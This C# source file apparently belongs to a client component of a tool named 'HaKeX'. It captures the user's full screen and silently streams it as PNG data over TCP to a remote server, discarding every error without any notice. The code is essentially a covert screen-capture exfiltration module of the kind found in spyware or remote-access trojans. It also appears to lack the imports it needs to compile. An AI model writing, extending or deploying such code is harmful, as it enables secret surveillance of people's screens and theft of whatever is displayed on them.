using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.Linq;
using System.Net.Sockets;
using System.Text;
using System.Threading.Tasks;

namespace HaKeXClient.HaKeXTCP
{
    internal class TcpClientHaKeX
    {
        private readonly string _serverIP;
        private readonly int _serverPort;

        public TcpClientHaKeX(string serverIP, int serverPort)
        {
            _serverIP = serverIP;
            _serverPort = serverPort;
        }

        public Bitmap CaptureScreenshot()
        {
            Rectangle bounds = Screen.PrimaryScreen.Bounds;
            Bitmap screenshot = new Bitmap(bounds.Width, bounds.Height, PixelFormat.Format32bppArgb);
            using (Graphics g = Graphics.FromImage(screenshot))
            {
                g.CopyFromScreen(bounds.Left, bounds.Top, 0, 0, bounds.Size, CopyPixelOperation.SourceCopy);
            }
            return screenshot;
        }

        public async Task SendScreenshotAsync()
        {
            try
            {
                using (TcpClient client = new TcpClient())
                {
                    await client.ConnectAsync(_serverIP, _serverPort);
                    using (NetworkStream stream = client.GetStream())
                    {
                        using (Bitmap screenshot = CaptureScreenshot())
                        using (MemoryStream ms = new MemoryStream())
                        {
                            screenshot.Save(ms, ImageFormat.Png);
                            byte[] imageBytes = ms.ToArray();

                            byte[] lengthBuffer = BitConverter.GetBytes(imageBytes.Length);
                            await stream.WriteAsync(lengthBuffer, 0, lengthBuffer.Length);

                            await stream.WriteAsync(imageBytes, 0, imageBytes.Length);
                        }
                    }
                }
            }
            catch (Exception ex)
            {

            }
        }
    }
}
